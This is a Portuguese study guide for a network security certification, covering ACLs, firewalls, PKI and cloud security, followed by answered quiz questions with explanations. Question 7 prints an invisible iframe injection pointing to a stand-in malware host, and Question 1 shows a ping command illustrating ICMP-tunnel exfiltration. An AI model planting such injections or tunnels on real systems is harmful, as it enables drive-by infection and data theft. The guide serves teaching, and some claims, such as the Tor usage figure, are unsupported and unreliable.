ACLs - Access Control Lists

Conceitos Fundamentais

  • ACL Estendida: Filtra IP origem, IP destino, protocolo e portas.
  • ACL Padrão: Filtra apenas IP de origem.
  • Established: Permite tráfego TCP com ACK/RST (conexões já abertas).
  • Wildcard: Define intervalo. Ex: 0.0.3.255 = 4 redes (/22).
  • Implicit Deny: Toda ACL termina com "deny any any".
Exemplo ACL Estendida
Router(config)# ip access-list extended SECURE
Router(config-ext-nacl)# permit tcp any 192.168.254.0 0.0.1.255 established
Router(config-ext-nacl)# end
✅ Permite apenas tráfego TCP de resposta para a rede 192.168.254.0/23

Wildcard na Prática

Desafio: Redes 192.168.16.0, 192.168.17.0, 192.168.18.0, 192.168.19.0

Máscara Wildcard Resultado
0.0.0.255 Apenas 192.168.16.0/24 ❌
0.0.3.255 16-19 (4 redes) ✅
0.0.15.255 0-15 (muito amplo) ⚠️
Dica: Wildcard = 0.0.3.255 → terceiro octeto varia nos 2 últimos bits (00010000 a 00010011)

Firewalls: Stateful vs Stateless + ZPF

Stateful

  • Mantém tabela de estado
  • Opera nas camadas 3, 4 e 5
  • Permite tráfego de retorno automaticamente
  • Limitação: Menos eficaz com UDP/ICMP

Stateless

  • Analisa pacotes individualmente
  • Opera nas camadas 3 e 4
  • Baseado em ACLs tradicionais
  • Mais simples, mas menos seguro

Zone-Based Policy Firewall (ZPF)

Zona Self

Tráfego destinado ao roteador ou originado dele.

Ações no ZPF

pass | drop | inspect

Primeiro Passo

Criar zonas → depois classes, políticas e zone-pairs.

Exemplo ZPF (conceitual)
zone security INTERNA
zone security DMZ
zone-pair security ZP_INTERNA_DMZ source INTERNA destination DMZ
service-policy type inspect POLICY_INSPECAO

Criptografia e PKI

Algoritmos

  • Simétricos: AES, 3DES (mesma chave)
  • Assimétricos: RSA, ECC (par público/privado)
  • Hash: MD5, SHA (integridade, não confidencialidade)

PKI

  • Autoridade Certificadora (CA) → terceiro confiável
  • Certificados digitais = identidade autorizada
  • Aplicações: HTTPS, 802.1X/EAP-TLS, VPN SSL

Segurança em Nuvem e Virtualização

VM Sprawl

Definição: Proliferação descontrolada de VMs → mais VMs do que conseguimos gerenciar eficientemente.

Causa: criação sem controle, falta de remoção após uso.

Microsegmentação

Criação de segmentos lógicos isolados sem hardware adicional. Usada em datacenters virtuais e segurança de containers.

Benefício: isolamento granular

Glossário Rápido

Lista de Controle de Acesso. Filtra tráfego baseado em regras. Padrão (só origem) ou Estendida (origem, destino, protocolo, porta).

Máscara usada em ACLs para definir intervalo de endereços. Bit 0 = deve corresponder, bit 1 = pode variar. Ex: 0.0.3.255 = 4 redes.

Mantém tabela de estado das conexões. Opera nas camadas 3, 4 e 5. Menos eficaz com UDP/ICMP.

Zone-Based Policy Firewall. Modelo moderno do Cisco IOS com zonas de segurança e políticas entre pares de zonas. Zona Self representa o roteador.

Infraestrutura de Chave Pública. Emite certificados digitais via CA (Autoridade Certificadora). Usada em HTTPS, 802.1X, assinaturas digitais.

Advanced Encryption Standard. Algoritmo de criptografia simétrica, usado para confidencialidade.

📌 Questão 1: Exfiltração de Dados

Táticas de Exfiltração
❓ Pergunta: Qual método é usado por algum malware para transferir arquivos de hosts infectados para um host de ator de ameaça?

✅ Resposta Correta

túneis ICMP

🔬 Por quê? O túnel ICMP encapsula dados maliciosos dentro de pacotes de eco (ping). Como muitos firewalls permitem tráfego ICMP para fins de diagnóstico, os atacantes abusam desse protocolo para exfiltrar dados sem serem detectados. Ferramentas como icmpsh ou Ping Tunnel são exemplos clássicos.

Análise das Distratores
  • Injeção iFrame: Usada para ataques drive-by-download ou redirecionamento, não para exfiltração.
  • Infiltração UDP: Termo não padronizado; UDP pode ser usado para C2, mas não é o método primário descrito.
  • Criptografia HTTPS: Protege dados, mas é um mecanismo de ofuscação, não um método específico de transferência de arquivos para o atacante.

$ ping -c 1 -p [dados] alvo.com
# Exemplo de encapsulamento ICMP

📌 Questão 2: Redes P2P

Tecnologias Descentralizadas
❓ Pergunta: Quais duas tecnologias são usadas principalmente em redes ponto a ponto?

✅ Respostas Corretas

Bitcoin BitTorrent

🔬 Por quê? Ambas operam sem um servidor central. O Bitcoin usa uma rede P2P para validar transações via consenso distribuído. O BitTorrent fragmenta arquivos e os distribui entre pares (peers), otimizando o download coletivo.

Contexto Técnico

Em redes P2P, cada nó (peer) atua como cliente e servidor. Isso elimina gargalos centrais, mas introduz desafios de segurança, como a propagação de malware via torrents fraudulentos.

🔗 BitTorrent: DHT (Distributed Hash Table)
💰 Bitcoin: Blockchain + Proof of Work

📌 Questão 3: Disfarce de Exploração

Evasão & Persistência
❓ Pergunta: Que técnica um ator ameaçador usaria para disfarçar vestígios de uma exploração em curso?

✅ Resposta Correta

Encapsular outros protocolos dentro do DNS

🔬 Por quê? O Túnel DNS é uma técnica furtiva que embute dados maliciosos em consultas/respostas DNS. Como o DNS é essencial para a navegação e geralmente não é inspecionado profundamente, o atacante pode estabelecer C2 (Comando e Controle) e exfiltrar dados sem levantar suspeitas.

Outras Técnicas
  • iFrame invisível: Usado para redirecionar vítimas ou baixar malware, mas não para apagar rastros.
  • Ataque NTP: Manipula timestamps, dificultando correlação de logs, mas é menos comum que o túnel DNS.
  • SSL/TLS: Embora ofusque, tráfego criptografado em excesso pode ser um indicador de anomalia em redes corporativas.

📌 Questão 4: Propósito do Tor

Anonimato Online
❓ Pergunta: Qual é o propósito do Tor?

✅ Resposta Correta

Permitir que os usuários naveguem na Internet anonimamente

🔬 Por quê? O The Onion Router (Tor) roteia o tráfego através de uma rede de relays voluntários, criptografando os dados em camadas (como uma cebola). Isso oculta o IP do usuário, garantindo anonimato contra vigilância e análise de tráfego.

Funcionamento Básico

1. Cliente -> Nó de Entrada -> Nó Intermediário -> Nó de Saída -> Destino.
Nenhum nó conhece o caminho completo, garantindo anonimato.

Uso comum: 75% dark web

📌 Questão 5: Mapeamento de Rede

Fase de Reconhecimento
❓ Pergunta: Que tipo de ataque determina quais IPs, protocolos e portas são permitidos pelas ACLs?

✅ Resposta Correta

Reconhecimento

🔬 Por quê? O Reconhecimento (Footprinting) é a fase inicial do Cyber Kill Chain. Ferramentas como Nmap ou Masscan são usadas para varrer a rede, identificar portas abertas, serviços ativos e regras de firewall (ACLs), preparando o terreno para o ataque.

Contramedidas
  • Configurar sistemas de detecção de varredura (Port Scan Detection).
  • Limitar respostas ICMP.
  • Utilizar honeypots para identificar atacantes em fase de reconhecimento.

📌 Questão 6: Análise Retrospectiva

Hunting & Forense
❓ Pergunta: Benefício de realizar análise retrospectiva após identificar malware?

✅ Resposta Correta

Rastrear o comportamento do malware a partir do ponto de identificação.

🔬 Por quê? A análise retrospectiva (retro-hunting) utiliza dados históricos (logs, NetFlow, PCAPs) para reconstruir a linha do tempo da infecção. Isso permite ver o que o malware fez antes e depois da detecção, movimentos laterais e dados acessados.

Exemplo Prático

Após um alerta de Trojan, o analista busca nos logs de proxy por conexões suspeitas nas últimas 48h, descobrindo que o malware já havia exfiltrado dados 12h antes do alerta.

📌 Questão 7: iFrames Maliciosos

Web Security
❓ Pergunta: Qual protocolo é explorado por cibercriminosos que criam iFrames maliciosos?

✅ Resposta Correta

HTTP

🔬 Por quê? O iFrame é uma tag HTML que carrega outro documento via HTTP/HTTPS. Ao injetar <iframe src="http://site-malicioso.com">, o atacante força o navegador a fazer uma requisição HTTP para o servidor malicioso, baixando payloads ou redirecionando a vítima.

Exemplo de Injeção
<iframe src="http://malware.com/exploit.html" width="0" height="0" frameborder="0"></iframe>

iFrame invisível usado para drive-by-download.

📌 Questão 9: NetFlow vs Wireshark

Ferramentas de Análise
❓ Pergunta: Principal diferença entre dados capturados pelo NetFlow e pelo Wireshark?

✅ Resposta Correta

NetFlow coleta metadados; Wireshark captura pacotes completos.

🔬 Por quê? NetFlow resume o tráfego em "flows" (5-tuplas, bytes, pacotes) – ideal para visão macro e tendências. Wireshark faz captura de pacote completo (PCAP), incluindo payload, permitindo inspeção forense detalhada.

Quando usar cada um?
  • NetFlow: Monitoramento de tráfego, detecção de anomalias, faturamento.
  • Wireshark: Análise de problemas pontuais, reconstrução de sessões, forense.

📌 Questão 10: Proxy DLP

Prevenção de Perda de Dados
❓ Pergunta: Como um proxy da Web fornece DLP?

✅ Resposta Correta

Escaneando e registrando tráfego de saída.

🔬 Por quê? O proxy inspeciona o tráfego de saída (egresso) em busca de padrões de dados sensíveis (CPF, cartão de crédito, documentos confidenciais). Se detectado, bloqueia ou gera alerta, evitando a exfiltração.

Tecnologias Envolvidas

Regex, Fingerprinting de documentos, Machine Learning para classificação de conteúdo.

📌 Questão 11: Serviços do NetFlow

Monitoramento & Billing
❓ Pergunta: Quais dois serviços são fornecidos pelo NetFlow?

✅ Respostas Corretas

Monitoramento de rede Faturamento baseado no uso

🔬 Por quê? O NetFlow fornece visibilidade de tráfego em tempo real (monitoramento) e coleta dados de consumo (bytes/pacotes), permitindo que ISPs ou departamentos de TI faturem clientes ou setores internos pelo uso da rede.

Aplicações Comuns
  • Detecção de picos de largura de banda.
  • Identificação de top falantes (top talkers).
  • Modelos de cobrança por tráfego em provedores.

📌 Questão 13: Appliance Cisco para Reputação

Cisco WSA
❓ Pergunta: Qual appliance Cisco filtra tráfego baseado na reputação do servidor Web?

✅ Resposta Correta

WSA (Web Security Appliance)

🔬 Por quê? O Cisco WSA atua como proxy web e utiliza o Web Reputation Score (WBRS) para classificar URLs. Baseado nessa pontuação, ele pode permitir, escanear ou bloquear o acesso, protegendo contra malware e C2.

Outros Appliances
  • ASA: Firewall de rede.
  • ESA: Segurança de e-mail (Email Security Appliance).
  • AVC: Visibilidade de aplicativos (Application Visibility and Control).

📌 Questão 14: lsass.exe suspeito

Análise de Processos
❓ Pergunta: Administrador encontra lsass.exe em Arquivos de Programas. O que fazer?

✅ Resposta Correta

Excluir, pois é provavelmente malware.

🔬 Por quê? O lsass.exe legítimo reside em C:\Windows\System32. Qualquer cópia em outro diretório (como Program Files) é quase certamente um malware disfarçado, tentando enganar o administrador ou usuário.

Perigo

Encerrar o processo legítimo do lsass causa uma falha crítica (tela azul). Por isso, é crucial verificar o caminho do arquivo antes de qualquer ação.

📌 Questão 15: Cisco Cognitive Intelligence

Machine Learning
❓ Pergunta: Que tipo de dados o Cisco Cognitive Intelligence usa para encontrar atividades maliciosas?

✅ Resposta Correta

Dados Estatísticos

🔬 Por quê? A ferramenta cria uma baseline estatística do comportamento normal da rede e identifica desvios (anomalias) usando modelos matemáticos. Isso permite detectar tráfego C2 que burlou outras defesas.

Conceito

Em vez de regras fixas (determinístico), a abordagem estatística aprende o que é "normal" e flagra comportamentos fora do padrão, como exfiltração de dados em horários incomuns.

📌 Questão 20: Seção de Opções do Snort

Estrutura de Regras
❓ Pergunta: Que informações estão contidas na seção de opções de uma regra Snort?

✅ Resposta Correta

Texto descrevendo o evento

🔬 Por quê? A seção de opções (entre parênteses) contém detalhes como msg:"Ataque X detectado", content:"...", sid:1000001. O cabeçalho, por outro lado, define ação, IPs, portas e direção.

Exemplo de Regra
alert tcp any any -> 192.168.1.0/24 80 (msg:"Acesso WEB detectado"; content:"GET"; sid:1000001;)

msg está nas opções.

📌 Questão 21: Classificação de Alertas

Verdadeiro Positivo
❓ Pergunta: Qual classificação indica que um alerta é verificado como incidente real?

✅ Resposta Correta

Positivo Real (Verdadeiro Positivo)

🔬 Por quê? Na matriz de confusão:
- Verdadeiro Positivo: Alerta gerado + Incidente real.
- Falso Positivo: Alerta gerado + Sem incidente.
- Falso Negativo: Sem alerta + Incidente real.
- Verdadeiro Negativo: Sem alerta + Sem incidente.

Matriz de Confusão
✅ TP (Alerta correto) | ❌ FP (Falso alarme)
❌ FN (Perdeu o ataque) | ✅ TN (Silêncio correto)

📌 Questão 22: Análise Probabilística

Incerteza & Evasão
❓ Pergunta: Dois cenários onde a análise probabilística é mais adequada?

✅ Respostas Corretas

  • Quando variáveis aleatórias criam dificuldade em conhecer o resultado com certeza.
  • Ao analisar aplicativos projetados para contornar firewalls.

🔬 Por quê? Em cenários de incerteza (randomização, ofuscação), métodos determinísticos falham. A análise probabilística usa modelos estatísticos para identificar comportamentos anômalos típicos de malware evasivo.

Exemplo

Um malware que muda de porta a cada conexão. Uma regra fixa não detectaria, mas um modelo probabilístico que calcula a entropia das portas usadas pode flagrar a atividade.

📌 Questão 23: Funções do Security Onion

NSM (Network Security Monitoring)
❓ Pergunta: Três funções principais do Security Onion?

✅ Respostas Corretas

Detecção de intruso Captura de pacote completo Análise de alerta

🔬 Por quê? O Security Onion é uma distribuição Linux focada em Monitoramento de Segurança de Rede. Ele integra Snort/Suricata (detecção), netsniff-ng (PCAP) e ELK (análise de alertas). Não realiza contenção ativa nem BCP.

📌 Questão 24: Falta de Alerta

Falso Negativo
❓ Pergunta: Agente violou firewall sem ser detectado pelo IDS. Que condição descreve a falta de alerta?

✅ Resposta Correta

Falso Negativo

🔬 Por quê? Houve incidente real (violação), mas o IDS não gerou alerta. Esta é a situação mais perigosa, pois a equipe de segurança fica às cegas diante de um ataque em andamento.

Prioridade

Em cibersegurança, os falsos negativos são considerados mais críticos que falsos positivos, pois representam uma falha de cobertura.
